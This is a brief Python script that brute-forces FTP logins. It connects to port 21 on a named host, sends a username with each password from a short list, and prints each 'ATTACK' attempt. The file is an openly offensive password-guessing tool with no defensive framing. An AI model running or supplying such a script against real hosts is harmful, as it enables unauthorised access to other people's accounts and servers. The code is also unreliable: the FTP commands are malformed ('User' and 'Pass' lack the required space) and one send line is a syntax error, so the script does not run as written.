import socket

def tryConnect(ip,user,passw):
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("ATTACK:" + ip + "|" + user + "|" + passw)
    thistuple=(ip,21)
    sock.connect(thistuple)
    data=sock.recv(1024)
    stringtosend='User' + user + '\r\n'
    sock.send(str.encode(stringtosend))
    data=sock.recv(1024)
    stringtosend='Pass' + passw + '\r\n'
    sock.send(str.encode(stringtosend))
    data=sock.recv(1024)
    sock.send(b'quit'\r\n')
    sock.close()
    return data
    
user='user1'
passwords=['pass@word', 'pass1', '123@abc', '123456']
    
    
for password in passwords:
    print(tryConnect("sampleasp.com", user, password))
    







